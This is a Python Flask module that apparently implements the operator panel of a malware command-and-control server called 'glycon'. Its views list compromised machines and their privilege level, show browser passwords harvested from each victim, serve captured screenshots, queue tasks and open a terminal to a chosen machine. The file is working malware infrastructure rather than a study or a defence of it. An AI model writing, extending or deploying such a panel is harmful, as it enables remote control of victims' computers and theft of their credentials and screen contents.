from flask import render_template, request, flash, redirect, url_for, send_file, send_from_directory
from flask_login import login_required
import sqlite3
import io
from datetime import datetime
from glycon.config import CONFIG

def init_view_routes(app):
    @app.route('/')
    @login_required
    def dashboard():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM agents")
        agent_count = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'")
        pending_tasks = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM credentials")
        credential_count = c.fetchone()[0]
        
        c.execute("SELECT * FROM agents ORDER BY last_seen DESC LIMIT 5")
        recent_agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], row)) 
                        for row in c.fetchall()]
        
        c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 5")
        recent_tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                       for row in c.fetchall()]
        
        conn.close()
        
        return render_template('dashboard.html', 
                             agent_count=agent_count,
                             pending_tasks=pending_tasks,
                             credential_count=credential_count,
                             recent_agents=recent_agents,
                             recent_tasks=recent_tasks)

    @app.route('/settings')
    @login_required
    def settings():
        return render_template('settings.html', CONFIG=CONFIG)

    @app.route('/agents')
    @login_required
    def agents():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
        agents = [dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], row)) 
                  for row in c.fetchall()]
        conn.close()
        return render_template('agents.html', agents=agents)

    @app.route('/agent/<agent_id>')
    @login_required
    def agent_detail(agent_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
        agent_data = c.fetchone()
        if not agent_data:
            flash("Agent not found", "danger")
            return redirect(url_for('agents'))
        
        agent = dict(zip(['id', 'hostname', 'ip', 'os', 'last_seen', 'status', 'privilege'], agent_data))
        
        c.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 20", (agent_id,))
        tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                 for row in c.fetchall()]
        
        c.execute("SELECT * FROM credentials WHERE agent_id=? ORDER BY timestamp DESC LIMIT 20", (agent_id,))
        creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
                 for row in c.fetchall()]
        
        c.execute("SELECT id, timestamp FROM screenshots WHERE agent_id=? ORDER BY timestamp DESC LIMIT 5", (agent_id,))
        screenshots = [dict(zip(['id', 'timestamp'], row)) for row in c.fetchall()]
        
        conn.close()
        
        return render_template('agent_detail.html', 
                             agent=agent, 
                             tasks=tasks, 
                             creds=creds,
                             screenshots=screenshots)

    @app.route('/terminal/<agent_id>')
    @login_required
    def terminal(agent_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
        agent_data = c.fetchone()
        conn.close()
        
        if not agent_data:
            flash("Agent not found", "danger")
            return redirect(url_for('agents'))
        
        agent = {
            'id': agent_data[0],
            'hostname': agent_data[1],
            'ip': agent_data[2],
            'os': agent_data[3],
            'last_seen': agent_data[4],
            'status': agent_data[5],
            'privilege': agent_data[6]
        }
        
        return render_template('terminal.html', agent=agent)

    @app.route('/screenshot/<int:screenshot_id>')
    @login_required
    def get_screenshot(screenshot_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT image FROM screenshots WHERE id=?", (screenshot_id,))
        result = c.fetchone()
        conn.close()
        
        if not result or not result[0]:
            flash("Screenshot not found or empty", "danger")
            return redirect(url_for('screenshots'))
        
        return send_file(
            io.BytesIO(result[0]),
            mimetype='image/png',
            download_name=f"screenshot_{screenshot_id}.png"
        )

    @app.route('/screenshots')
    @login_required
    def screenshots():
        agent_id = request.args.get('agent_id')
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        if agent_id:
            c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                         FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                         WHERE s.agent_id=? ORDER BY s.timestamp DESC LIMIT 50''', (agent_id,))
        else:
            c.execute('''SELECT s.id, s.timestamp, a.hostname, a.id as agent_id 
                         FROM screenshots s JOIN agents a ON s.agent_id = a.id 
                         ORDER BY s.timestamp DESC LIMIT 50''')
        
        screenshots = [dict(zip(['id', 'timestamp', 'hostname', 'agent_id'], row)) 
                      for row in c.fetchall()]
        
        conn.close()
        return render_template('screenshots.html', screenshots=screenshots)

    @app.route('/credentials')
    @login_required
    def credentials():
        browser = request.args.get('browser', 'all')
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        if browser == 'all':
            c.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
        else:
            c.execute("SELECT * FROM credentials WHERE browser=? ORDER BY timestamp DESC LIMIT 100", 
                     (browser,))
        
        creds = [dict(zip(['id', 'agent_id', 'browser', 'url', 'username', 'password', 'timestamp'], row)) 
                 for row in c.fetchall()]
        
        conn.close()
        return render_template('credentials.html', credentials=creds)

    @app.route('/tasks')
    @login_required
    def tasks():
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100")
        tasks = [dict(zip(['id', 'agent_id', 'task_type', 'task_data', 'status', 'created_at', 'completed_at'], row)) 
                 for row in c.fetchall()]
        conn.close()
        return render_template('tasks.html', tasks=tasks)